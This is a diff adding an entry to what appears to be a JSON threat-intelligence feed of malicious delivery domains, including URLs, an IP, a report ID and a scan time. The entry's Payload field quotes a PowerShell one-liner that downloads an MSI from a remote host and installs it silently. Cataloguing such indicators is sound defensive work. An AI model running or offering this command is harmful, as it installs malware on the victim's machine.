@@ -1,5 +1,24 @@
 [
   {
+    "UrlDomain": "flashingdocs.com",
+    "DeliveryUrl": [
+      "softsyncizobrazie.net"
+    ],
+    "PayloadUrl": [
+      "http://softsyncizobrazie.net/x"
+    ],
+    "IP": [
+      "188.114.97.0"
+    ],
+    "Related": [],
+    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
+    "ResolvedDownloadUrl": [
+      "http://softsyncizobrazie.net/x"
+    ],
+    "ReportId": "cmwf9tn7k0fqr0omliwntu216",
+    "ScannedAt": "2026-11-13T17:48:56.960000+00:00"
+  },
+  {
     "UrlDomain": "duocthaolila.com",
     "DeliveryUrl": [
       "browse-cloud.codes",
